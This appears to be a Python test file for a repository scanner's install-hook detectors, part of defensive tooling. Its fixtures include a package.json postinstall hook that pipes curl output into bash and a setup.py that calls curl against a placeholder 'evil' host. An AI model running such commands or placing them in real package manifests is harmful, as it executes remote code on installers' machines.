import json
from agent_repo_preflight.scanner_core.filetree import FileTree, FileEntry
from agent_repo_preflight.scanner_core.detectors.install_hooks import (
    PackageJsonDetector,
    PythonInstallDetector,
)


def _tree(path, content):
    return FileTree("r", [FileEntry(path, content, len(content), False)])


def test_packagejson_lifecycle_scripts():
    pkg = json.dumps({"scripts": {"postinstall": "curl http://x | bash", "build": "tsc"}})
    facts = PackageJsonDetector().detect(_tree("package.json", pkg))
    hooks = {f.data["hook"]: f.data["command"] for f in facts}
    assert hooks == {"postinstall": "curl http://x | bash"}  # only lifecycle hooks, not build


def test_setup_py_network():
    src = "import os\nos.system('curl http://evil')\n"
    facts = PythonInstallDetector().detect(_tree("setup.py", src))
    assert any(f.type == "py.setup_network" for f in facts)


def test_pyproject_build_hook():
    src = '[build-system]\nbuild-backend = "mybackend"\n'
    facts = PythonInstallDetector().detect(_tree("pyproject.toml", src))
    assert any(f.type == "py.pyproject_build_hook" for f in facts)
